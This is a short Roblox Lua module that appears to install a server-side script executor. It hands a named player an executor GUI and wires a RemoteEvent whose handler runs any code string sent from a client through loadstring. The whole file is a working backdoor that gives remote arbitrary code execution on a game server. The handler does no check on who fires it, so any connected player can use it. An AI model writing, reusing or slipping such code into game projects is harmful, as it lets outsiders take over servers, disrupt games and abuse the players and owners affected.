local module = {}
function module:GiveExecutor(PlayerName)
	script.Name = "Giver"
	-- Variables
	local Executor = script:WaitForChild("ExecutorCustom")
	local Target = nil
	for i, v in game:GetService("Players"):GetPlayers() do
		if v.Name == PlayerName then
			Target = v
		end
	end
	if Target == nil then warn("Player Not Found, Returning") return end
	local ExecuteEvent = game:GetService("ReplicatedStorage"):FindFirstChild("ExecuteEvent")
	if ExecuteEvent == nil then
		ExecuteEvent = Instance.new("RemoteEvent")
		-- Setting Up RemoteEvent
		ExecuteEvent.Name = "ExecuteEvent"
		ExecuteEvent.Parent = game:GetService("ReplicatedStorage")
	end
	Executor.Parent = Target:FindFirstChild("PlayerGui")
	Executor.Enabled = true
	Executor.Setup.Enabled = true
	ExecuteEvent.OnServerEvent:Connect(function(plr, code)
		loadstring(code)()
	end)
end
